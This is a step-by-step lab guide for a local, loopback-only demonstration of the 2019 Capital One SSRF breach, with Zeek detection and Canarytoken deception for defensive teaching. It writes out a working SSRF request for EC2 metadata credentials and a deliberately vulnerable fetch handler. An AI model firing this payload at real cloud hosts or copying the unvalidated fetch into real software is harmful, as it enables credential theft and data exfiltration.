# Step-by-Step Manual Execution Guide: Capital One Breach Demo

A command-by-command manual walkthrough for running the entire demonstration interactively without using automated wrapper scripts.

This guide provides the exact terminal command, the technical explanation of what happens under the hood, and the narrative to share with your audience for each individual step.

> [!TIP]
> **Prefer an automated interactive runner?**  
> Run `python3 run_interactive_demo.py` (or `./run_simulation_mac.sh -i`). It automatically presents each step with a concise description and only executes the next command when you press **[ENTER]**.


---

## Prerequisites & Directory Setup

Open your terminal and navigate to the project directory:

```bash
cd /Users/shreya/Desktop/CapitalOne_Demo
```

> **Note on OS Differences:**
> - On **macOS**: The loopback interface is `lo0` and uses `ifconfig`.
> - On **Linux / Docker**: The loopback interface is `lo` and uses `ip addr`.
> Commands below provide both options where applicable.

---

## Phase 1: Environment & Network Configuration

### Conceptual Primer: What You Need to Know

Before running the commands, here is the technical background behind this lab architecture:

#### 1. What is the AWS Instance Metadata Service (IMDS)?
In AWS, every virtual machine (EC2 instance) has access to a built-in HTTP service called the **Instance Metadata Service (IMDS)**.
- **Where it lives:** It is hardcoded in the AWS hypervisor to listen on a non-routable link-local IP address: `169.254.169.254` on standard HTTP port `80`.
- **Why it exists:** Applications and automation scripts running *inside* an EC2 instance frequently need to know about their environment (e.g., instance ID, AMI ID, public/private IP, availability zone, user data).
- **The IAM Role link (The Critical Attack Surface):** When you attach an AWS IAM Role to an EC2 instance, AWS automatically mints temporary STS session credentials (`AccessKeyId`, `SecretAccessKey`, and session `Token`) and makes them available via `http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>`. This is convenient because developers do not have to hardcode permanent AWS secret keys into their application code.
- **The Flaw in IMDSv1:** In IMDS version 1, this service requires **zero authentication**—any process on the virtual machine that sends a basic HTTP `GET` request can read these credentials in plain text. If an internet-facing application has a Server-Side Request Forgery (SSRF) flaw, an external attacker can force the server to fetch these credentials on their behalf!

#### 2. What does "Looping Back" mean?
- A **loopback interface** (`lo0` on macOS, `lo` on Linux) is a virtual, purely software-based network adapter inside the operating system.
- When any program sends network packets to a loopback address (most commonly `127.0.0.1` or `localhost`), the OS kernel intercepts the packet and **loops it back** immediately into the machine's local receiving stack. The packet **never touches physical network hardware, cables, or Wi-Fi routers**.
- **Why we loop back `169.254.169.254` locally:** In a real AWS data center, `169.254.169.254` is handled directly by the EC2 Xen/Nitro hypervisor. On your personal laptop, this IP address does not exist. If you tried to connect to `169.254.169.254`, your laptop would not know where to send it and would drop the packet. By creating an **IP alias** on your loopback interface (`lo0 alias 169.254.169.254`), we instruct the local OS: *"Whenever any program requests 169.254.169.254, loop the traffic straight back to this local machine!"* This allows us to run a simulated AWS metadata service locally on port 80.

---

### Step 1: Configure the AWS Link-Local Metadata IP Alias

AWS instances host the Instance Metadata Service at the link-local address `169.254.169.254`. In our local lab, we bind this address directly to our loopback interface.

#### Command:

**macOS:**
```bash
sudo ifconfig lo0 alias 169.254.169.254 up
```

**Linux / Inside Docker:**
```bash
sudo ip addr add 169.254.169.254/32 dev lo
```

#### What happens technically:
- **Loopback Aliasing:** This command adds `169.254.169.254` as a secondary IP address assigned to your machine's virtual loopback adapter (`lo0` / `lo`).
- **Routing Decision:** The operating system's kernel routing table now treats `169.254.169.254` as "local host" traffic. Any outbound packet destined for `169.254.169.254` is immediately routed back into the local software network stack.
- **Isolation:** Because link-local addresses (`169.254.0.0/16` per RFC 3927) are non-routable across routers, keeping this on loopback ensures that all lab traffic stays strictly confined to your machine and can be cleanly inspected by packet capture tools like Zeek.

#### What to explain to your audience:
> *"In AWS EC2, the instance metadata service always lives at `169.254.169.254`. On a local computer, that IP would normally be unreachable. By assigning `169.254.169.254` as an alias to our loopback interface (`lo0`), we trick our operating system into looping back all metadata requests to our local processes, perfectly recreating AWS's network topology on a single machine."*

---

### Step 2: Launch the Fake AWS Metadata Service (IMDSv1)

Start the mock metadata server on port `80`:

#### Command:
```bash
python3 services/fake_metadata.py 0.0.0.0 80 &
```


#### Deep Dive: What is inside `fake_metadata.py`?
`fake_metadata.py` is a lightweight Python HTTP server (`http.server.HTTPServer`) built specifically to mimic AWS's EC2 IMDSv1 service. Here is what has been put inside it:

1. **Simulated IAM STS Credentials (`CREDS_DATA`):**
   ```python
   CREDS_DATA = {
       "Code": "Success",
       "LastUpdated": "2026-09-29T08:00:00Z",
       "Type": "AWS-HMAC",
       "AccessKeyId": "ASIAEXAMPLEWAFROLE12345",
       "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
       "Token": "AQoDYXdzEJr111111111111111111111111111111111111111111111111111111111111111111111111",
       "Expiration": "2026-12-31T00:00:00Z"
   }
   ```
   - Notice the key begins with `ASIA`. In AWS, keys starting with `ASIA` are temporary security credentials minted dynamically by the AWS Security Token Service (STS).
   - This represents the exact IAM role credentials Capital One's WAF EC2 instance had assigned to it (`WAF-Role-CapitalOne-Production`).

2. **Simulated S3 Exfiltration Data (`S3_EXFIL_DATA`):**
   ```python
   S3_EXFIL_DATA = {
       "status": "success",
       "message": "Simulated S3 sync exfiltration completed",
       "bucket": "s3://capitalone-card-applications-production-us-east-1",
       "records_dumped": 106000000,
       "pii_extracted": ["ssn", "name", "address", "credit_score", "account_balances"]
   }
   ```
   - This mimics the consequence of the 2019 breach: the stolen role had broad S3 read permissions (`s3:ListBucket`, `s3:GetObject`), enabling Paige Thompson to run `aws s3 sync` and siphon 106 million customer credit card applications.

3. **HTTP Routing Logic (`MetadataHandler`):**
   - Responds to standard IMDS endpoints:
     - `/` or `/latest/meta-data/` &rarr; returns directory listing (`iam/`, `ami-id`, `instance-id`, `local-ipv4`).
     - `/latest/meta-data/iam/security-credentials/` &rarr; returns the role name `WAF-Role-CapitalOne-Production`.
     - `/latest/meta-data/iam/security-credentials/WAF-Role-CapitalOne-Production` &rarr; returns the `CREDS_DATA` JSON payload.
     - `/mock-s3-bucket/sync` &rarr; returns `S3_EXFIL_DATA`.

#### What happens technically:
The server binds to `0.0.0.0:80`. Because we configured the loopback alias in Step 1, any HTTP GET request sent to `http://169.254.169.254:80/` lands directly inside this Python handler.

#### Verify it works:
```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Expected Output:**
```text
WAF-Role-CapitalOne-Production
```

#### What to explain to your audience:
> *"Our fake metadata server listens on port 80 and returns the exact REST endpoints an AWS EC2 instance exposes. In a legitimate architecture, the application on the server accesses this without a password. But because IMDSv1 uses plain HTTP GET requests without token verification, it becomes a goldmine for an attacker who can trigger server-side requests."*

---

### Step 3: Launch the Vulnerable ModSecurity Reverse Proxy

Start the toy application that simulates the misconfigured, SSRF-vulnerable WAF reverse proxy on port `8080`:

#### Command:
```bash
python3 services/vuln_app.py 8080 &
```


#### Deep Dive: What is inside `vuln_app.py`?
`vuln_app.py` simulates Capital One's Web Application Firewall (WAF) reverse proxy (historically ModSecurity running inside an Apache/Nginx proxy tier).

Here is the exact code logic that creates the vulnerability:
1. **The Exposed Proxy Endpoint (`/fetch?url=<target>`):**
   ```python
   query = urllib.parse.parse_qs(parsed.query)
   target_url = query.get("url", [None])[0]
   ```
   The application accepts a destination URL parameter from any inbound client.

2. **The Flawed Server-Side Fetch:**
   ```python
   req = urllib.request.Request(target_url, headers={"User-Agent": "WAF-Proxy-Demo/1.0"})
   with urllib.request.urlopen(req, timeout=4) as response:
       content = response.read()
       ...
       self.wfile.write(content)
   ```
   - **Why this is vulnerable:** Look at what is missing! There is **no domain whitelist**, **no URL scheme validation**, and **no private/link-local IP filtering** (e.g. blocking `169.254.0.0/16`, `127.0.0.1`, `10.0.0.0/8`).
   - The application blindly executes a server-side HTTP `GET` request using Python's `urllib.request.urlopen()`, receives the response, and forwards the full body and status code directly back to the caller!

#### What is Server-Side Request Forgery (SSRF)?
In the real world:
1. An attacker located on the public internet **cannot directly connect** to `http://169.254.169.254` because that IP only exists within the internal AWS environment.
2. However, the WAF server sits right at the network boundary: it has a public IP facing the internet **AND** an internal network interface capable of reaching `169.254.169.254`.
3. By feeding `http://169.254.169.254/...` into the `/fetch?url=` parameter, the attacker forces the WAF server to make the request from inside the trusted boundary.
4. The request **loops back** locally: the WAF server calls `169.254.169.254`, fetches the secret credentials, and mirrors them back to the external attacker!

```
+-------------------+      1. Attacker sends HTTP GET       +---------------------------------------------+
| External Attacker | -----------------------------------> | Vulnerable WAF Reverse Proxy (Port 8080)    |
| (Public Internet) | <----------------------------------- | vuln_app.py                                 |
+-------------------+     4. WAF relays AWS keys to        +---------------------------------------------+
                             attacker                                     |                  ^
                                                                          | 2. Server-side   | 3. Returns
                                                                          |    fetch loops   |    AWS IAM
                                                                          |    back locally  |    Role Keys
                                                                          v                  |
                                                           +---------------------------------------------+
                                                           | AWS Metadata Service (169.254.169.254:80)   |
                                                           | fake_metadata.py (lo0 loopback alias)       |
                                                           +---------------------------------------------+
```

#### Verify it works:
```bash
curl -s http://127.0.0.1:8080/
```

**Expected Output:**
```html
<h1>Capital One Vulnerable WAF Simulation</h1>
<p>Endpoint: <code>/fetch?url=&lt;target&gt;</code></p>
<p>This service fetches requested URLs server-side without validation (SSRF).</p>
```

#### What to explain to your audience:
> *"This application simulates Capital One's misconfigured ModSecurity WAF reverse proxy. Because input validation was omitted, an external user can supply any arbitrary destination URL in the `url` parameter. The WAF server will dutifully issue the HTTP request on behalf of the client. Since the WAF runs inside AWS with internal access to `169.254.169.254`, it bridges the gap between the untrusted outside world and the privileged internal cloud metadata."*

---

## Phase 2: Zeek Network Security Monitoring

### Step 4: Inspect the Zeek Detection Policy

Show the audience how compact and straightforward the Zeek policy script is:

#### Command:
```bash
cat zeek/ssrf_detect.zeek
```

**Output to show:**
```zeek
module SSRF;

export {
    redef enum Notice::Type += {
        Metadata_Access
    };
}

event http_request(c: connection, method: string, original_URI: string,
                    unescaped_URI: string, version: string)
    {
    if ( c$id$resp_h == 169.254.169.254 )
        {
        NOTICE([$note=SSRF::Metadata_Access,
                $msg=fmt("Possible SSRF: AWS EC2 metadata service accessed by %s (Requested URI: %s)",
                         c$id$orig_h, original_URI),
                $conn=c]);
        }
    }
```

#### What to explain:
> *"This Zeek script passively inspects HTTP requests. Whenever a packet's responding IP matches `169.254.169.254`, Zeek immediately raises a high-priority `SSRF::Metadata_Access` security notice. There is no regex searching through gigabytes of logs after the fact; it fires as the packet crosses the interface."*

---

### Step 5: Start Zeek Network Capture

Create a working directory for logs and start Zeek monitoring the loopback interface:

#### Command:

**macOS:**
```bash
mkdir -p logs_live && cd logs_live
sudo zeek -C -i lo0 "$(pwd)/../zeek/ssrf_detect.zeek" &
ZEEK_PID=$!
cd ..
```

**Linux / Inside Docker:**
```bash
mkdir -p logs_live && cd logs_live
sudo zeek -C -i lo "$(pwd)/../zeek/ssrf_detect.zeek" &
ZEEK_PID=$!
cd ..
```


*(Note: The `-C` flag tells Zeek to ignore TCP checksum offloading, which is standard for loopback traffic).*

#### Verify Zeek is running:
```bash
ps aux | grep zeek | grep -v grep
```

---

## Phase 3: Execute the Simulated Attacks

### Step 6: Execute Attack 1 — SSRF IAM Credential Extraction

Now simulate the attacker querying the WAF proxy to steal AWS IAM credentials:

#### Command:
```bash
curl -s "http://127.0.0.1:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-Role-CapitalOne-Production"
```

**Expected Output:**
```json
{
  "Code": "Success",
  "LastUpdated": "2026-09-29T08:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAEXAMPLEWAFROLE12345",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr111111111111111111111111111111111111111111111111111111111111111111111111",
  "Expiration": "2026-12-31T00:00:00Z"
}
```

#### What happens technically (The Full Loopback Trace):
Let's trace how the components we set up interact in this single command:
1. **Inbound HTTP Request:** Your terminal acts as the external attacker, issuing a GET request to `vuln_app.py` listening on port `8080`.
2. **Query Parameter Extraction:** `vuln_app.py` extracts the `url` parameter: `http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-Role-CapitalOne-Production`.
3. **Server-Side Request (SSRF):** `vuln_app.py` executes `urllib.request.urlopen()`.
4. **Looping Back to Localhost:** The OS kernel evaluates destination IP `169.254.169.254`. Because we configured the loopback alias (`lo0`), the kernel does **not** look for an external gateway—it immediately **loops the packet back** into our local machine.
5. **Fake Metadata Interception:** `fake_metadata.py` (listening on port 80) receives this looped-back packet, recognizes the requested role credential URI, and returns the `CREDS_DATA` dictionary serialized as JSON.
6. **Relay Back to Attacker:** `vuln_app.py` receives the JSON from the loopback connection and forwards it straight back to your terminal `curl`.
7. **Passive Packet Sniffing:** Meanwhile, Zeek (sniffing `lo0`) silently observes this HTTP conversation traversing port 80 to `169.254.169.254` and marks it for immediate alerting.

#### What to explain to your audience:
> *"The attacker sends a GET request to the proxy at port 8080 asking for the metadata URL. The proxy fetches it and returns the temporary AWS session token and credentials. In 2019, this is where Paige Thompson obtained Capital One's WAF role keys. Because the WAF role had overprivileged permissions, these stolen credentials unlocked access far beyond the WAF itself."*

---

### Step 7: Execute Attack 2 — Simulated S3 Data Exfiltration

Simulate the attacker issuing data sync commands:

#### Command:
```bash
curl -s "http://127.0.0.1:8080/fetch?url=http://169.254.169.254/mock-s3-bucket/sync"
```

**Expected Output:**
```json
{
  "status": "success",
  "message": "Simulated S3 sync exfiltration completed",
  "bucket": "s3://capitalone-card-applications-production-us-east-1",
  "records_dumped": 106000000,
  "pii_extracted": [
    "ssn",
    "name",
    "address",
    "credit_score",
    "account_balances"
  ]
}
```

#### What happens technically:
- In the real 2019 breach, Paige Thompson didn't stop at reading credentials. She exported the `ASIA...` access key, secret key, and session token into her local AWS CLI environment and ran `aws s3 sync s3://<capital-one-buckets>`.
- In our simulation, we query `/mock-s3-bucket/sync` through the vulnerable proxy. `fake_metadata.py` handles this endpoint by returning `S3_EXFIL_DATA`, confirming the simulated exfiltration of 106 million customer credit card applications containing Social Security numbers, credit scores, and financial records.

#### What to explain to your audience:
> *"Once the attacker has the IAM credentials, the boundary between the perimeter WAF and the internal core data warehouse evaporates. They can interact directly with AWS APIs, dumping over a hundred million sensitive records without touching the internal databases directly."*

---

### Step 8: Stop Zeek to Flush Capture Logs to Disk

Wait 2 seconds for packet buffers, then terminate Zeek with `SIGINT` (`kill -INT`):

#### Command:
```bash
sleep 2
sudo kill -INT $ZEEK_PID 2>/dev/null || sudo pkill -INT zeek
```

Now list the generated log files:
```bash
ls -la logs_live/
```

You will see `conn.log`, `http.log`, `notice.log`, etc.

---

## Phase 4: Forensic Investigation & Cross-Log Correlation

### Step 9: View the Security Notice Alert

Inspect the automated alert raised by your Zeek script:

#### Command:
```bash
zeek-cut ts uid note msg < logs_live/notice.log
```

**Expected Output:**
```text
1790672629.461230  CjbXsRqWg8nivYnui  SSRF::Metadata_Access  Possible SSRF: AWS EC2 metadata service accessed by 169.254.169.254 (Requested URI: /latest/meta-data/iam/security-credentials/WAF-Role-CapitalOne-Production)
```

#### What to explain:
> *"Here is the payoff: `notice.log` generated a security alert with zero manual querying. Notice the unique Connection UID token: `CjbXsRqWg8nivYnui`. That UID is the glue that correlates the entire incident."*

---

### Step 10: Pivot to Application Payload (`http.log`)

Filter `http.log` using the alert's UID:

#### Command:
```bash
ALERT_UID=$(zeek-cut uid < logs_live/notice.log | head -n 1)
zeek-cut uid method host uri status_code < logs_live/http.log | grep "$ALERT_UID"
```

**Expected Output:**
```text
CjbXsRqWg8nivYnui  GET  169.254.169.254  /latest/meta-data/iam/security-credentials/WAF-Role-CapitalOne-Production  200
```

#### What to explain:
> *"By grepping for that same UID, we instantly pull up the exact application transaction: the HTTP GET method, the host header, the exact URI, and the HTTP 200 response."*

---

### Step 11: Pivot to Transport Flow (`conn.log`)

Now inspect the Layer 4 transport connection using the same UID:

#### Command:
```bash
zeek-cut uid id.orig_h id.resp_h id.resp_p proto orig_bytes resp_bytes < logs_live/conn.log | grep "$ALERT_UID"
```

**Expected Output:**
```text
CjbXsRqWg8nivYnui  169.254.169.254  169.254.169.254  80  tcp  191  478
```

#### What to explain:
> *"In `conn.log`, we have complete transport telemetry: source IP, destination IP, port 80, TCP protocol, and exact bytes transferred. Notice that both `id.orig_h` and `id.resp_h` show `169.254.169.254`—this is the physical signature of the loopback interface we configured in Step 1! The local OS routed the packet from the local proxy process directly back into the local mock server. In 2019, Capital One's incident response team spent months manually correlating disconnected VPC flow logs with web logs. Zeek binds application payloads and network transport flows together deterministically in real time via that single UID."*

---

## Phase 5: Active Deception with Canarytokens

Now showcase the second defense layer: active deception via honeytokens.

### Step 12: Plant the Decoy Credentials

Plant decoy AWS credentials under the `[canary]` profile:

#### Command:
```bash
python3 -c "
import os
path = os.path.expanduser('~/.aws/credentials')
os.makedirs(os.path.dirname(path), exist_ok=True)
with open(path, 'a') as f:
    f.write('''
[canary]
aws_access_key_id = AKIATU7L4S6WVXD4O77Z
aws_secret_access_key = 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
''')
"
```

Verify the file:
```bash
grep -A 2 "\[canary\]" ~/.aws/credentials
```

#### What to explain:
> *"When attackers gain access to an EC2 instance, they systematically search for stored credentials in files like `~/.aws/credentials`. We intentionally plant an AWS honeytoken generated from Canarytokens.org. To the attacker, it looks like a valid production key."*

---

### Step 13: Simulate Attacker Key Reconnaissance

When attackers discover credentials, the first command they run is identity verification (`sts:GetCallerIdentity`):

#### Command:
```bash
aws sts get-caller-identity --profile canary --region us-east-1
```

**Expected Output:**
```json
{
    "UserId": "AIDATU7L4S6W5LRX4CBJF",
    "Account": "251213420461",
    "Arn": "arn:aws:iam::251213420461:user/azqjoxxwnbghiqrlgpsilbuqdrvuarunrsbsgtbgvlitxufczq"
}
```

#### What happens technically:
1. The AWS CLI signs an STS request using the decoy secret key and sends it to `sts.amazonaws.com`.
2. AWS routes the verification to Thinkst's honeypot account `251213420461`.
3. AWS CloudTrail records the API call event.
4. Thinkst triggers an instant notification to your registered email or webhook.

#### What to explain:
> *"The API call succeeded against Thinkst's monitoring infrastructure. Even if an attacker uses encrypted channels or proxies that bypass network sensors, the moment they touch this credential, their public IP, timestamp, and tooling are transmitted directly to the SOC."*

---

## Phase 6: Teardown & Clean Up

When you finish your live demonstration, run these cleanup commands:

### Command:
```bash
# 1. Kill background Python processes (proxy and metadata service)
pkill -f fake_metadata.py
pkill -f vuln_app.py

# 2. Remove the loopback IP alias
# macOS:
sudo ifconfig lo0 -alias 169.254.169.254 2>/dev/null || true
# Linux / Docker:
sudo ip addr del 169.254.169.254/32 dev lo 2>/dev/null || true

# 3. Clean up live log test folder
rm -rf logs_live
```

---

## Command Quick-Reference Table

| Step | Command | Description |
|---|---|---|
| **1** | `sudo ifconfig lo0 alias 169.254.169.254 up` | Create link-local metadata IP alias |
| **2** | `python3 services/fake_metadata.py 0.0.0.0 80 &` | Start mock AWS IMDSv1 service |
| **3** | `python3 services/vuln_app.py 8080 &` | Start vulnerable reverse proxy |
| **4** | `sudo zeek -C -i lo0 zeek/ssrf_detect.zeek &` | Start Zeek loopback packet capture |

| **5** | `curl "http://127.0.0.1:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-Role-CapitalOne-Production"` | Fire SSRF credential extraction attack |
| **6** | `sudo kill -INT <ZEEK_PID>` | Stop Zeek and flush logs to disk |
| **7** | `zeek-cut ts uid note msg < notice.log` | View real-time security notice alert |
| **8** | `zeek-cut uid method host uri < http.log \| grep <UID>` | Correlate HTTP application payload |
| **9** | `zeek-cut uid id.orig_h id.resp_h proto < conn.log \| grep <UID>` | Correlate Layer 4 transport connection |
| **10** | `aws sts get-caller-identity --profile canary --region us-east-1` | Trigger Canarytoken tripwire alert |
| **11** | `sudo ifconfig lo0 -alias 169.254.169.254` | Remove loopback alias |
